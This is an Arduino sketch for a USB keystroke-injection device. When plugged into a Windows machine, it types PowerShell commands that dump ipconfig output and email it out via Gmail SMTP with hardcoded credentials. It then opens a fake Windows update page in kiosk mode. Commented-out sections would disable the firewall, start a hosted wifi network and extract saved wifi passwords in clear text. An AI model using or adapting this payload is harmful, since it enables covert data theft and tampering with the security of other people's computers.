#include <HID.h>
#include <Keyboard.h>

// Init function
void setup()
{
  // Start Keyboard and Mouse
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  delay(900);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("powershell.exe");
  delay(1000);

  //int x = 0;
  //Keyboard.println("$winVersion = Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption");
 /* if ( Keyboard.println("$winVersion") == Keyboard.println("Microsoft Windows 7 Professional") )
  {
    Keyboard.println("Start-Process powershell -verb runAs");
    delay(500);
    Keyboard.println("P@ssw0rd");
    delay(500);
  }*/
  
  /*
  //else
  //{
   Keyboard.println("Start-Process powershell -verb runAs");
    Keyboard.press(KEY_LEFT_ARROW);
    Keyboard.releaseAll();
    delay(500);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);
    //Keyboard.println("cd C:\Users\$env:UserName\AppData\Local\Temp");
  //}
  */




  
  //Keyboard.println("cmd.exe");
  //delay(500);
  /*
  Keyboard.println("netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678");
  delay(100);
  Keyboard.println("netsh wlan start hostednetwork");
  delay(100);
  Keyboard.println("netsh firewall set opmode disable");

  Keyboard.println("cd \"C:\\Temp\" & for /f \"tokens=2 delims=:\" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");
  Keyboard.println("set A=\"%A:~1%\"");
  Keyboard.println("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");
  Keyboard.println("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");
  Keyboard.println("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");
  Keyboard.println("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");
  Keyboard.println("del A.txt");
  Keyboard.println("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");
  Keyboard.println("exit");
  */
  Keyboard.println("ipconfig /all >> C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\ipconfig.txt");
  Keyboard.println("$EmailTo = \"trepcip@gmail.com\"");
  Keyboard.println("$EmailFrom = \"trepcip@gmail.com\"");
  Keyboard.println("$Subject = \"Test\""); 
  Keyboard.println("$Body = \"$(Get-Content \"C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\ipconfig.txt\" | out-string)\""); 
  Keyboard.println("$SMTPServer = \"smtp.gmail.com\"");  
  Keyboard.println("$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)");
 // Keyboard.println("$attachment = New-Object System.Net.Mail.Attachment((Get-Content Log.txt | out-string))");
//  Keyboard.println("$SMTPMessage.Attachments.Add($attachment)");
  Keyboard.println("$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"); 
  Keyboard.println("$SMTPClient.EnableSsl = $true"); 
  Keyboard.println("$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(\"trepcip@gmail.com\", \"P@ssw0rdP@ssw0rd\")"); 
  Keyboard.println("$SMTPClient.Send($SMTPMessage)");
  

  /*
  
  delay(2000);
  Keyboard.println("exit");
  delay(500);
  Keyboard.println("del Log.txt");
  /*
/*
  Keyboard.println("netsh wlan set hostednetwork mode=disallow");
  delay(100);
  Keyboard.println("netsh wlan stop hostednetwork");
  delay(100);
 // Keyboard.println("netsh firewall set opmode enable");

*/

  delay(1000);
  Keyboard.println(" & \'C:\\Program Files\\internet explorer\\iexplore.exe\' -k http://fakeupdate.net/win10u/index.html ");

  Keyboard.end();
  
}

// Unused
void loop() 
{

}
